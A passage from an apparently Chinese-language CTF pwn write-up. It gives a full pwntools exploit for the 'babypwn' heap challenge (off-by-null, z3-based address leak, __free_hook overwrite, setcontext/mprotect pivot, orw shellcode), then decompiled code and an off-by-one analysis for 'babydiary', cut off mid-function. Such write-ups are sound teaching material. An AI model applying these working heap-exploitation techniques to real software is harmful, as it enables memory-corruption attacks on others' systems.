class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路：<ul><li>申请一个0x200大小的堆块，这样它的header为0x211。通过<code>sub_EB1</code>检测函数中的替换功能，可以将堆块header头的<code>\x11</code>替换为<code>\x00</code>，这样就类似于off by null了。</li><li>使用z3解决输出的加密后，泄露libc和heap地址。</li><li>程序使用了沙盒，使用orw读取flag。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./babypwn&#x27;</span>, env= &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libseccomp.so.2&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">   cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   init-pwndbg</span></span><br><span class="line"><span class="string">   bpie 0xE69</span></span><br><span class="line"><span class="string">   bpie 0x10CB</span></span><br><span class="line"><span class="string">   bpie 0xD90</span></span><br><span class="line"><span class="string">   bpie 0xF9A</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   gdb.attach(sh, cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">target</span>):</span></span><br><span class="line">   a1 = BitVec(<span class="string">&#x27;a1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">   x = a1</span><br><span class="line">   <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">      x ^= (<span class="number">32</span> * x) ^ LShR((x ^ (<span class="number">32</span> * x)), <span class="number">17</span>) ^ (((<span class="number">32</span> * x) ^ x ^ LShR((x ^ (<span class="number">32</span> * x)), <span class="number">17</span>)) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">   s = Solver()</span><br><span class="line">   s.add(x == target)</span><br><span class="line">   <span class="keyword">assert</span> s.check() == sat</span><br><span class="line">   <span class="keyword">return</span> (s.model()[a1].as_long())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.recvline()</span><br><span class="line">   tmp1 = solve(<span class="built_in">int</span>(sh.recvline(keepends = <span class="literal">False</span>), <span class="number">16</span>))</span><br><span class="line">   tmp2 = solve(<span class="built_in">int</span>(sh.recvline(keepends = <span class="literal">False</span>), <span class="number">16</span>))</span><br><span class="line">   <span class="keyword">return</span> (tmp2 &lt;&lt; <span class="number">32</span>) + tmp1</span><br><span class="line"></span><br><span class="line">[add(<span class="number">0x1f0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">[free(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">[add(<span class="number">0x1f0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">heapbase = show(<span class="number">0</span>) - <span class="number">0xcb0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f0</span>)</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>)</span><br><span class="line">[free(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0xa0</span>) <span class="comment"># 0</span></span><br><span class="line">libc.address = show(<span class="number">0</span>) - <span class="number">0x3ebe90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x148</span>) <span class="comment"># 1</span></span><br><span class="line">addr = heapbase + <span class="number">0x1ab0</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x148</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x140</span> + p64(<span class="number">0x150</span> + <span class="number">0xa0</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x1f0</span>) + p64(addr) * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">mprotect = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xa0</span> + p64(free_hook))</span><br><span class="line">add(<span class="number">0x140</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x140</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line"><span class="number">0x68</span>: free_hook &amp; ~<span class="number">0xfff</span>,</span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x1000</span>,</span><br><span class="line"><span class="number">0x88</span>: <span class="number">7</span>,</span><br><span class="line"><span class="number">0xa0</span>: free_hook + <span class="number">0x18</span>,</span><br><span class="line"><span class="number">0xa8</span>: mprotect&#125;)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">orw = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">mov rdi, &#123;flag&#125;</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, &#123;bss&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x300</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, &#123;bss&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(flag = free_hook + <span class="number">0x8</span>, bss = free_hook + <span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p64(setcontext) + <span class="string">&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="number">0</span>) + p64(free_hook + <span class="number">0x20</span>) + orw)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><ul><li><p>这里由于<code>free</code>函数向后合并的时候需要检测nextinuse，所以伪造的下下个chunk的inuse位一定要为1，否则会进入<code>unlink</code>函数，并报错<code>corrupted size vs. prev_size</code>。</p><ul><li>这里对应的是第69行的<code>p64(0x211)</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">4302</span>       <span class="comment">/* consolidate forward */</span></span><br><span class="line">  <span class="number">4303</span>       <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">► <span class="number">4304</span> unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  <span class="number">4305</span> size += nextsize;</span><br><span class="line">  <span class="number">4306</span>       &#125; <span class="keyword">else</span></span><br><span class="line">  <span class="number">4307</span> clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></li><li><p>使用unlink函数的时候，如果单纯想要制造堆块重叠，其实只需要将fd和bk设置为伪堆块的头部指针即可 ，这样<code>*(FD -&gt; bk)= p</code>和<code>*(BK -&gt; fd)= p</code>两个条件都满足。</p></li><li><p>在setcontext的过程中，我们要赋给esp的运行地址，且要压入<code>mprotect</code>的函数地址，如果需要在前面加上<code>./flag\x00\x00</code>字符串的话，需要空8个字节，否则字符串就会被<code>mprotect</code>的函数地址覆盖了。</p></li><li><p>setcontext我们已经遇到好几次了，发现不同师傅有不同的写法，实际上还可以这么写：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.rsp = free_hook + <span class="number">0x18</span></span><br><span class="line"><span class="comment"># sig.rbp = sig.rsp</span></span><br><span class="line">sig.rip = mprotect</span><br><span class="line">sig.rdi = free_hook &amp; ~<span class="number">0xfff</span></span><br><span class="line">sig.rsi = <span class="number">0x1000</span></span><br><span class="line">sig.rdx = <span class="number">7</span></span><br><span class="line"><span class="comment"># sig.csgsfs = 0x2b000000000033</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">str</span>(sig))</span><br></pre></td></tr></table></figure><ul><li>使用gdb进行attach的函数真挺好用的：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">   cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   init-pwndbg</span></span><br><span class="line"><span class="string">   bpie 0xE69</span></span><br><span class="line"><span class="string">   bpie 0x10CB</span></span><br><span class="line"><span class="string">   bpie 0xD90</span></span><br><span class="line"><span class="string">   bpie 0xF9A</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   gdb.attach(sh, cmd)</span><br></pre></td></tr></table></figure><h3 id="babydiary"><a href="#babydiary" class="headerlink" title="babydiary"></a>babydiary</h3><ul><li>使用IDA反编译程序：</li></ul><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110090137891.png" alt="image-20211007224952773" style="zoom:50%;" /><ul><li>发现初始化函数可能存在花指令，将1268地址的数据修改为nop，再进行反编译，就可以看到初始化函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_1269</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_4060[i] = <span class="number">0LL</span>;</span><br><span class="line">    dword_4140[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> alarm(<span class="number">0x78</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>main函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_18BD</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1416();</span><br><span class="line">    result = sub_13C3();</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">if</span> ( result &gt; <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">switch</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sub_1814();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_169D();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_17A8();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_10:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>add函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_169D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span> &amp;&amp; qword_4060[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    v1 = sub_13C3();</span><br><span class="line">    qword_4060[i] = <span class="built_in">malloc</span>(v1 + <span class="number">1</span>);<span class="comment">// qword_4060存放地址</span></span><br><span class="line">    <span class="keyword">if</span> ( qword_4060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      v2 = sub_132B(qword_4060[i], v1, <span class="number">10</span>);<span class="comment">// myread函数</span></span><br><span class="line">      sub_1528((<span class="keyword">unsigned</span> <span class="keyword">int</span>)i, v2);<span class="comment">// 关键函数，这里传入了写入的字符个数v2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进myread函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_132B</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">int</span>)i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)read(<span class="number">0</span>, (<span class="keyword">void</span> *)((<span class="keyword">int</span>)i + a1), <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a3 == *(_BYTE *)((<span class="keyword">int</span>)i + a1) )<span class="comment">// 换行符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)((<span class="keyword">int</span>)i + a1) = <span class="number">0</span>;<span class="comment">// 多写一位，但是由于前面malloc的参数已经加1，所以这里没有溢出</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_1528</code>关键函数，发现函数往输入的末位写入一位类似校验位的数据，这就造成了off by one漏洞，如果我们能够控制好输入的内容，就可以任意溢出一个字节，修改后一个chunk的size位：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_1528</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0x18</span> &amp;&amp; qword_4060[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = qword_4060[a1];</span><br><span class="line">    dword_4140[a1] = a2;<span class="comment">// dword_4140存放写入数量</span></span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">      *(_BYTE *)(a2 + <span class="number">1LL</span> + v2) = (*(_BYTE *)(a2 + <span class="number">1LL</span> + v2) &amp; <span class="number">0xF0</span>) + sub_146E(a1);</span><br><span class="line">  &#125;<span class="comment">// 末位的后一位进行重新赋值，off by one</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_146E</code>函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_146E</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x18</span> || !qword_4060[a1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_4140[a1]; ++i )</span><br><span class="line">    v3 += *(<span class="keyword">unsigned</span> __int8 *)(i + qword_4060[a1]);<span class="comment">// 取出堆块内容中的每一个int8</span></span><br><span class="line">  <span class="keyword">while</span> ( v3 &gt; <span class="number">0xF</span> )<span class="comment">// 如果v3大于0xf</span></span><br><span class="line">    v3 = (v3 &gt;&gt; <span class="number">4</span>) + (v3 &amp; <span class="number">0xF</span>);<span class="comment">// 求出除以16的商和余数，求和</span></span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>show函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_17A8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v1 = sub_13C3();</span><br><span class="line">  result = sub_15DF(v1) ^ <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;content: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)qword_4060[v1]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>跟进<code>sub_15DF</code>检测函数，该函数检测<code>v2</code>与计算出来的位之和共奇偶，就可以打印：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_15DF</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">24</span> || !qword_4060[a1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v3 = dword_4140[a1];<span class="comment">// 注意新建堆时必须要填入内容，否则检测函数会判断错误，并返回0</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v2 = *(_BYTE *)(v3 + <span class="number">1LL</span> + 